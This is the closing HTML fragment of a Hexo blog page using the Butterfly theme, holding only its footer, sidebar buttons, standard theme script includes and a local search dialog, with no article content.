class="copyright">&copy;2019 - 2025 By wanTh3flag</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
